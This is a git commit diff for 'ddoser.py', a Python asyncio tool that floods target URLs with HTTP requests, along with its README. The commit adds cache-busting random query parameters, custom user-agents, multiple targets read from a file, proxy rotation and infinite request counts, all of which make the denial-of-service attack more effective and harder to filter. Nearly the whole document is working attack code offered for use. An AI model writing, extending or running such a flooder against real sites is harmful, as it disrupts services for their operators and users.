b3d2786b361e8898903cb6c8895c466bdd1908c5
Sergey Taran <s.taran@ueni.com>
2022-02-28 17:07:32 +0200

    Add random get argument to prevent cache usage, custom user-agent and log to stdout option

--- README.md
+++ README.md
@@ -11,14 +11,18 @@ Usage: ddoser.py [OPTIONS]
   Run ddoser
 
 Options:
-  --target-url TEXT      ddos target url  [required]
-  --proxy-url TEXT       url to proxy resourse
-  --proxy-file TEXT      path to file with proxy list
-  --concurrency INTEGER  concurrency level
-  --count INTEGER        requests count
-  --timeout INTEGER      requests timeout
-  --verbose              Show verbose log
-  --help                 Show this message and exit.
+  --target-url TEXT        ddos target url
+  --target-urls-file TEXT  path to file contains urls to ddos
+  --proxy-url TEXT         url to proxy resourse
+  --proxy-file TEXT        path to file with proxy list
+  --concurrency INTEGER    concurrency level
+  --count INTEGER          requests count (0 for infinite)
+  --timeout INTEGER        requests timeout
+  --verbose                Show verbose log
+  --with-random-get-param  add random get argument to prevent cache usage
+  --user-agent TEXT        custom user agent
+  --log-to-stdout          log to console
+  --help                   Show this message and exit.
 ```
 proxy-file or proxy-url should contain proxy list in format like:
 ```text
--- ddoser.py
+++ ddoser.py
@@ -5,7 +5,11 @@ import os
 import sys
 from collections import defaultdict
 from itertools import cycle
+from random import randint
 from typing import Iterable, List, Tuple
+import urllib.parse as urlparse
+from urllib.parse import urlencode
+
 
 import aiohttp
 import click
@@ -15,17 +19,19 @@ from aiohttp_socks import ProxyConnector
 STATS = defaultdict(int)
 
 
-def config_logger(verbose):
-    filename = os.path.abspath(sys.argv[0]).split('.')[0] + '.log'
+def config_logger(verbose, log_to_stdout):
+    kwargs = {}
+    if not log_to_stdout:
+        kwargs['filename'] = os.path.abspath(sys.argv[0]).split('.')[0] + '.log'
     logging.basicConfig(
-        filename=filename,
         level=logging.DEBUG if verbose else logging.INFO,
         format="[%(asctime)s] %(levelname)s:  %(message)s",
         datefmt="%d-%m-%Y %I:%M:%S",
+        **kwargs
     )
 
 
-async def make_request(url: str, proxy: str, timeout: int):
+async def make_request(url: str, proxy: str, timeout: int, user_agent: str):
     timeout = aiohttp.ClientTimeout(total=timeout)
     logging.debug('Url: %s Proxy: %s', url, proxy)
     try:
@@ -34,6 +40,9 @@ async def make_request(url: str, proxy: str, timeout: int):
             client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
         else:
             client_session = aiohttp.ClientSession(timeout=timeout)
+        if user_agent:
+            client_session.headers['user-agent'] = user_agent
+
         async with client_session as session:
             async with session.get(url) as response:
                 await response.text()
@@ -53,22 +62,38 @@ def get_proxy(proxy_iterator: Iterable[str]) -> str:
         return None
 
 
-async def ddos(target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]]):
+def prepare_url(url: str, with_random_get_param: bool):
+    if with_random_get_param:
+        url_parts = list(urlparse.urlparse(url))
+        query = dict(urlparse.parse_qsl(url_parts[4]))
+        query.update({f'param_{randint(0, 1000)}': str(randint(0, 100000))})
+        url_parts[4] = urlencode(query)
+        return urlparse.urlunparse(url_parts)
+    return url
+
+
+async def ddos(
+        target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
+        with_random_get_param: bool, user_agent: str
+):
     step = 0
     while True:
         if count and step > count:
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        await make_request(target_url, proxy, timeout)
+        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, user_agent)
 
 
-async def amain(target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]]):
+async def amain(
+        target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
+        with_random_get_param: bool, user_agent: str
+):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target_url in target_urls:
         for _ in range(concurrency):
-            coroutines.append(ddos(target_url, timeout, count, proxy_iterator))
+            coroutines.append(ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent))
     await asyncio.gather(*coroutines)
 
 
@@ -81,10 +106,15 @@ async def amain(target_urls: List[str], timeout: int, concurrency: int, count: i
 @click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
 @click.option('--timeout', help='requests timeout', type=int, default=5)
 @click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
+@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
+@click.option('--user-agent', help='custom user agent')
+@click.option('--log-to-stdout', help='log to console', is_flag=True)
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
-        concurrency: int, count: int, timeout: int, verbose: bool):
-    config_logger(verbose)
+        concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
+        user_agent: str, log_to_stdout: str
+):
+    config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
         raise SystemExit('--target-url or --target-urls-file is required')
     proxies = load_proxies(proxy_file, proxy_url)
@@ -95,7 +125,7 @@ def main(
     if target_url:
         target_urls.append(target_url)
     loop = asyncio.get_event_loop()
-    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, proxies))
+    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent))
     for key, value in STATS.items():
         if key != 'success':
             logging.info("%s: %s", key, value)
